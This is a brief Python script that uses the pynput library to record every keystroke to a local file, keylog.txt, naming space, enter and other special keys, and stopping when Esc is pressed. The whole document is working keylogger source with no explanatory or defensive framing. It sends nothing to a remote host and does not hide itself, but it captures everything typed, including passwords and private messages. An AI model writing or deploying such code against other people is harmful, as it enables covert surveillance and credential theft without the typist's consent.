from pynput.keyboard import Listener, Key

logPath = "keylog.txt"

def on_press(key):
    try:
        with open(logPath, "a") as log_file:
            log_file.write(f'{key.char}\n')
    except AttributeError:
        # Handle special keys like space, enter, etc.
        with open(logPath, "a") as log_file:
            if key == Key.space:
                log_file.write("SPACE\n")
            elif key == Key.enter:
                log_file.write("ENTER\n")
            elif key == Key.esc:
                log_file.write("ESC\n")
                print("Esc key pressed. Exiting...")
                return False  
            else:
                log_file.write(f'{key}\n')  # Log other special keys

with Listener(on_press=on_press) as listener:
    listener.join()
